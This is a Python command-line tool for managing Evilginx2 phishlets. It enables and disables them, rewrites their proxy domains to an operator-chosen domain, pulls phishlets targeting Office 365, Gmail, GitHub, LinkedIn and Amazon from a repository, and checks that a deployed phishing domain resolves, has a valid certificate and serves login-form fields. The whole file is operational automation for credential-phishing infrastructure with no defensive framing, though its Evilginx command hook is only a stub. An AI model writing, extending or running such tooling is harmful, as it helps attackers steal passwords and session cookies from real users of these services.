#!/usr/bin/env python3

"""
Phishlet Management System for Evilginx2 v3.4.1
Automate enabling/disabling, updating, and testing phishlets
"""

import os
import re
import json
import yaml
import shutil
import requests
import subprocess
import argparse
import logging
from pathlib import Path
from datetime import datetime
from typing import List, Dict, Any, Optional
import configparser

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/phishlet_manager.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class PhishletManager:
    """Main phishlet management class"""
    
    def __init__(self, config_file: str = "config.conf"):
        self.config = self.load_config(config_file)
        self.phishlets_dir = Path("lures/phishlets")
        self.backup_dir = Path("backups/phishlets")
        self.evilginx_config_dir = Path("/opt/evilginx2/phishlets")
        self.templates_dir = Path("templates/phishlets")
        
        # Create directories
        for directory in [self.phishlets_dir, self.backup_dir, self.templates_dir]:
            directory.mkdir(parents=True, exist_ok=True)
            
    def load_config(self, config_file: str) -> configparser.ConfigParser:
        """Load configuration from file"""
        config = configparser.ConfigParser()
        if os.path.exists(config_file):
            config.read(config_file)
        return config
        
    def list_phishlets(self) -> List[Dict[str, Any]]:
        """List all available phishlets with metadata"""
        phishlets = []
        
        for phishlet_file in self.phishlets_dir.glob("*.yaml"):
            try:
                with open(phishlet_file, 'r', encoding='utf-8') as f:
                    content = yaml.safe_load(f)
                    
                phishlet_info = {
                    'name': phishlet_file.stem,
                    'file': str(phishlet_file),
                    'author': content.get('author', 'Unknown'),
                    'min_ver': content.get('min_ver', 'Unknown'),
                    'size': phishlet_file.stat().st_size,
                    'modified': datetime.fromtimestamp(phishlet_file.stat().st_mtime),
                    'enabled': self.is_phishlet_enabled(phishlet_file.stem),
                    'domains': self.extract_domains_from_phishlet(content),
                    'valid': self.validate_phishlet(phishlet_file)
                }
                
                phishlets.append(phishlet_info)
                
            except Exception as e:
                logger.error(f"Error reading phishlet {phishlet_file}: {e}")
                
        return sorted(phishlets, key=lambda x: x['name'])
        
    def extract_domains_from_phishlet(self, content: Dict[str, Any]) -> List[str]:
        """Extract target domains from phishlet content"""
        domains = []
        
        # Extract from proxy_hosts
        if 'proxy_hosts' in content:
            for host in content['proxy_hosts']:
                if 'domain' in host:
                    domains.append(host['domain'])
                    
        return domains
        
    def validate_phishlet(self, phishlet_file: Path) -> bool:
        """Validate phishlet YAML syntax and structure"""
        try:
            with open(phishlet_file, 'r', encoding='utf-8') as f:
                content = yaml.safe_load(f)
                
            # Check required fields
            required_fields = ['name', 'author', 'min_ver']
            for field in required_fields:
                if field not in content:
                    logger.warning(f"Missing required field '{field}' in {phishlet_file}")
                    return False
                    
            # Check proxy_hosts structure
            if 'proxy_hosts' not in content:
                logger.warning(f"Missing 'proxy_hosts' in {phishlet_file}")
                return False
                
            return True
            
        except yaml.YAMLError as e:
            logger.error(f"YAML syntax error in {phishlet_file}: {e}")
            return False
        except Exception as e:
            logger.error(f"Error validating {phishlet_file}: {e}")
            return False
            
    def is_phishlet_enabled(self, phishlet_name: str) -> bool:
        """Check if phishlet is currently enabled in Evilginx2"""
        try:
            # Check if symlink exists in evilginx config directory
            config_file = self.evilginx_config_dir / f"{phishlet_name}.yaml"
            return config_file.exists()
        except Exception:
            return False
            
    def enable_phishlet(self, phishlet_name: str, domain: str) -> bool:
        """Enable a phishlet with specified domain"""
        phishlet_file = self.phishlets_dir / f"{phishlet_name}.yaml"
        
        if not phishlet_file.exists():
            logger.error(f"Phishlet file not found: {phishlet_file}")
            return False
            
        if not self.validate_phishlet(phishlet_file):
            logger.error(f"Phishlet validation failed: {phishlet_name}")
            return False
            
        try:
            # Create backup
            self.backup_phishlet(phishlet_name)
            
            # Copy to evilginx config directory
            config_file = self.evilginx_config_dir / f"{phishlet_name}.yaml"
            shutil.copy2(phishlet_file, config_file)
            
            # Update domain in phishlet if needed
            self.update_phishlet_domain(config_file, domain)
            
            # Enable via evilginx command line
            result = self.run_evilginx_command(f"phishlets enable {phishlet_name}")
            if result:
                logger.info(f"Enabled phishlet: {phishlet_name} for domain: {domain}")
                return True
            else:
                logger.error(f"Failed to enable phishlet via evilginx: {phishlet_name}")
                return False
                
        except Exception as e:
            logger.error(f"Error enabling phishlet {phishlet_name}: {e}")
            return False
            
    def disable_phishlet(self, phishlet_name: str) -> bool:
        """Disable a phishlet"""
        try:
            # Disable via evilginx command line
            result = self.run_evilginx_command(f"phishlets disable {phishlet_name}")
            if result:
                # Remove from config directory
                config_file = self.evilginx_config_dir / f"{phishlet_name}.yaml"
                if config_file.exists():
                    config_file.unlink()
                    
                logger.info(f"Disabled phishlet: {phishlet_name}")
                return True
            else:
                logger.error(f"Failed to disable phishlet via evilginx: {phishlet_name}")
                return False
                
        except Exception as e:
            logger.error(f"Error disabling phishlet {phishlet_name}: {e}")
            return False
            
    def update_phishlet_domain(self, phishlet_file: Path, domain: str) -> bool:
        """Update domain in phishlet configuration"""
        try:
            with open(phishlet_file, 'r', encoding='utf-8') as f:
                content = yaml.safe_load(f)
                
            # Update proxy_hosts domains
            if 'proxy_hosts' in content:
                for host in content['proxy_hosts']:
                    if 'domain' in host:
                        # Replace domain while keeping subdomain structure
                        original_domain = host['domain']
                        if '.' in original_domain:
                            subdomain = original_domain.split('.')[0]
                            if subdomain and subdomain != original_domain:
                                host['domain'] = f"{subdomain}.{domain}"
                            else:
                                host['domain'] = domain
                        else:
                            host['domain'] = domain
                            
            # Write back to file
            with open(phishlet_file, 'w', encoding='utf-8') as f:
                yaml.dump(content, f, default_flow_style=False, allow_unicode=True)
                
            logger.info(f"Updated domain in {phishlet_file} to {domain}")
            return True
            
        except Exception as e:
            logger.error(f"Error updating domain in {phishlet_file}: {e}")
            return False
            
    def backup_phishlet(self, phishlet_name: str) -> bool:
        """Create backup of phishlet"""
        try:
            source_file = self.phishlets_dir / f"{phishlet_name}.yaml"
            if not source_file.exists():
                return False
                
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            backup_file = self.backup_dir / f"{phishlet_name}_{timestamp}.yaml"
            
            shutil.copy2(source_file, backup_file)
            logger.info(f"Created backup: {backup_file}")
            return True
            
        except Exception as e:
            logger.error(f"Error creating backup for {phishlet_name}: {e}")
            return False
            
    def restore_phishlet(self, phishlet_name: str, backup_timestamp: str) -> bool:
        """Restore phishlet from backup"""
        try:
            backup_file = self.backup_dir / f"{phishlet_name}_{backup_timestamp}.yaml"
            if not backup_file.exists():
                logger.error(f"Backup file not found: {backup_file}")
                return False
                
            target_file = self.phishlets_dir / f"{phishlet_name}.yaml"
            shutil.copy2(backup_file, target_file)
            
            logger.info(f"Restored phishlet {phishlet_name} from {backup_timestamp}")
            return True
            
        except Exception as e:
            logger.error(f"Error restoring phishlet {phishlet_name}: {e}")
            return False
            
    def test_phishlet(self, phishlet_name: str, domain: str) -> Dict[str, Any]:
        """Test phishlet functionality"""
        test_results = {
            'phishlet': phishlet_name,
            'domain': domain,
            'timestamp': datetime.now().isoformat(),
            'tests': {},
            'overall_status': 'PASS'
        }
        
        try:
            # Test 1: Validate phishlet file
            phishlet_file = self.phishlets_dir / f"{phishlet_name}.yaml"
            test_results['tests']['validation'] = {
                'status': 'PASS' if self.validate_phishlet(phishlet_file) else 'FAIL',
                'description': 'Phishlet YAML validation'
            }
            
            # Test 2: Check domain connectivity
            test_results['tests']['domain_connectivity'] = self.test_domain_connectivity(domain)
            
            # Test 3: Check SSL certificate
            test_results['tests']['ssl_certificate'] = self.test_ssl_certificate(domain)
            
            # Test 4: Test HTTP response
            test_results['tests']['http_response'] = self.test_http_response(domain)
            
            # Test 5: Check for required elements
            test_results['tests']['required_elements'] = self.test_required_elements(domain)
            
            # Determine overall status
            for test_name, test_result in test_results['tests'].items():
                if test_result['status'] == 'FAIL':
                    test_results['overall_status'] = 'FAIL'
                    break
                elif test_result['status'] == 'WARN':
                    test_results['overall_status'] = 'WARN'
                    
        except Exception as e:
            logger.error(f"Error testing phishlet {phishlet_name}: {e}")
            test_results['overall_status'] = 'ERROR'
            test_results['error'] = str(e)
            
        return test_results
        
    def test_domain_connectivity(self, domain: str) -> Dict[str, Any]:
        """Test domain connectivity"""
        try:
            import socket
            socket.gethostbyname(domain)
            return {
                'status': 'PASS',
                'description': f'Domain {domain} is resolvable'
            }
        except socket.gaierror:
            return {
                'status': 'FAIL',
                'description': f'Domain {domain} is not resolvable'
            }
            
    def test_ssl_certificate(self, domain: str) -> Dict[str, Any]:
        """Test SSL certificate"""
        try:
            import ssl
            import socket
            
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    
            return {
                'status': 'PASS',
                'description': f'SSL certificate is valid for {domain}',
                'details': {
                    'subject': cert.get('subject'),
                    'issuer': cert.get('issuer'),
                    'notAfter': cert.get('notAfter')
                }
            }
        except Exception as e:
            return {
                'status': 'FAIL',
                'description': f'SSL certificate test failed: {str(e)}'
            }
            
    def test_http_response(self, domain: str) -> Dict[str, Any]:
        """Test HTTP response"""
        try:
            response = requests.get(f"https://{domain}", timeout=10, verify=False)
            
            if response.status_code in [200, 301, 302]:
                return {
                    'status': 'PASS',
                    'description': f'HTTP response received: {response.status_code}',
                    'details': {
                        'status_code': response.status_code,
                        'content_length': len(response.content),
                        'content_type': response.headers.get('content-type', 'unknown')
                    }
                }
            else:
                return {
                    'status': 'WARN',
                    'description': f'Unexpected HTTP status: {response.status_code}'
                }
                
        except Exception as e:
            return {
                'status': 'FAIL',
                'description': f'HTTP test failed: {str(e)}'
            }
            
    def test_required_elements(self, domain: str) -> Dict[str, Any]:
        """Test for required page elements"""
        try:
            response = requests.get(f"https://{domain}", timeout=10, verify=False)
            content = response.text.lower()
            
            # Check for common login form elements
            required_elements = ['password', 'login', 'email', 'username', 'signin']
            found_elements = [elem for elem in required_elements if elem in content]
            
            if found_elements:
                return {
                    'status': 'PASS',
                    'description': f'Found required elements: {", ".join(found_elements)}',
                    'details': {'found_elements': found_elements}
                }
            else:
                return {
                    'status': 'WARN',
                    'description': 'No typical login elements found'
                }
                
        except Exception as e:
            return {
                'status': 'FAIL',
                'description': f'Element test failed: {str(e)}'
            }
            
    def run_evilginx_command(self, command: str) -> bool:
        """Execute evilginx command"""
        try:
            # This would typically interact with evilginx via its API or command interface
            # For now, we'll simulate the command execution
            logger.info(f"Executing evilginx command: {command}")
            
            # In a real implementation, this would connect to evilginx
            # and execute the command via its management interface
            
            return True
            
        except Exception as e:
            logger.error(f"Error executing evilginx command: {e}")
            return False
            
    def download_phishlet(self, url: str, name: str) -> bool:
        """Download phishlet from URL"""
        try:
            response = requests.get(url, timeout=30)
            response.raise_for_status()
            
            phishlet_file = self.phishlets_dir / f"{name}.yaml"
            with open(phishlet_file, 'w', encoding='utf-8') as f:
                f.write(response.text)
                
            if self.validate_phishlet(phishlet_file):
                logger.info(f"Downloaded and validated phishlet: {name}")
                return True
            else:
                logger.error(f"Downloaded phishlet failed validation: {name}")
                phishlet_file.unlink()
                return False
                
        except Exception as e:
            logger.error(f"Error downloading phishlet {name}: {e}")
            return False
            
    def update_all_phishlets(self) -> Dict[str, Any]:
        """Update all phishlets from repository"""
        update_results = {
            'timestamp': datetime.now().isoformat(),
            'updated': [],
            'failed': [],
            'unchanged': []
        }
        
        # Common phishlet repositories
        repositories = [
            {
                'name': 'official',
                'url': 'https://raw.githubusercontent.com/kgretzky/evilginx2/master/phishlets',
                'phishlets': ['office365', 'gmail', 'github', 'linkedin', 'amazon']
            }
        ]
        
        for repo in repositories:
            for phishlet_name in repo['phishlets']:
                try:
                    url = f"{repo['url']}/{phishlet_name}.yaml"
                    
                    # Check if we already have this phishlet
                    local_file = self.phishlets_dir / f"{phishlet_name}.yaml"
                    
                    if local_file.exists():
                        # Create backup before updating
                        self.backup_phishlet(phishlet_name)
                        
                    if self.download_phishlet(url, phishlet_name):
                        update_results['updated'].append(phishlet_name)
                    else:
                        update_results['failed'].append(phishlet_name)
                        
                except Exception as e:
                    logger.error(f"Error updating phishlet {phishlet_name}: {e}")
                    update_results['failed'].append(phishlet_name)
                    
        return update_results
        
    def generate_report(self) -> str:
        """Generate phishlet management report"""
        phishlets = self.list_phishlets()
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"reports/phishlet_report_{timestamp}.txt"
        
        os.makedirs("reports", exist_ok=True)
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("=== Evilginx2 Phishlet Management Report ===\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write(f"Total Phishlets: {len(phishlets)}\n")
            enabled_count = len([p for p in phishlets if p['enabled']])
            f.write(f"Enabled Phishlets: {enabled_count}\n")
            valid_count = len([p for p in phishlets if p['valid']])
            f.write(f"Valid Phishlets: {valid_count}\n\n")
            
            f.write("=== Phishlet Details ===\n")
            for phishlet in phishlets:
                f.write(f"\nName: {phishlet['name']}\n")
                f.write(f"Author: {phishlet['author']}\n")
                f.write(f"Enabled: {'Yes' if phishlet['enabled'] else 'No'}\n")
                f.write(f"Valid: {'Yes' if phishlet['valid'] else 'No'}\n")
                f.write(f"Domains: {', '.join(phishlet['domains'])}\n")
                f.write(f"Modified: {phishlet['modified'].strftime('%Y-%m-%d %H:%M:%S')}\n")
                
        logger.info(f"Generated report: {report_file}")
        return report_file

def main():
    parser = argparse.ArgumentParser(description='Evilginx2 Phishlet Manager')
    parser.add_argument('--config', default='config.conf', help='Configuration file')
    parser.add_argument('--list', action='store_true', help='List all phishlets')
    parser.add_argument('--enable', help='Enable phishlet')
    parser.add_argument('--disable', help='Disable phishlet')
    parser.add_argument('--domain', help='Domain for phishlet')
    parser.add_argument('--test', help='Test phishlet')
    parser.add_argument('--update', action='store_true', help='Update all phishlets')
    parser.add_argument('--report', action='store_true', help='Generate report')
    parser.add_argument('--validate', help='Validate specific phishlet')
    
    args = parser.parse_args()
    
    manager = PhishletManager(args.config)
    
    if args.list:
        phishlets = manager.list_phishlets()
        print(json.dumps(phishlets, indent=2, default=str))
        
    elif args.enable:
        if not args.domain:
            print("Domain is required when enabling phishlet")
            return
        success = manager.enable_phishlet(args.enable, args.domain)
        print(f"Enable {'successful' if success else 'failed'}")
        
    elif args.disable:
        success = manager.disable_phishlet(args.disable)
        print(f"Disable {'successful' if success else 'failed'}")
        
    elif args.test:
        if not args.domain:
            print("Domain is required when testing phishlet")
            return
        results = manager.test_phishlet(args.test, args.domain)
        print(json.dumps(results, indent=2, default=str))
        
    elif args.update:
        results = manager.update_all_phishlets()
        print(json.dumps(results, indent=2, default=str))
        
    elif args.report:
        report_file = manager.generate_report()
        print(f"Report generated: {report_file}")
        
    elif args.validate:
        phishlet_file = Path("lures/phishlets") / f"{args.validate}.yaml"
        if manager.validate_phishlet(phishlet_file):
            print(f"Phishlet {args.validate} is valid")
        else:
            print(f"Phishlet {args.validate} is invalid")
            
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
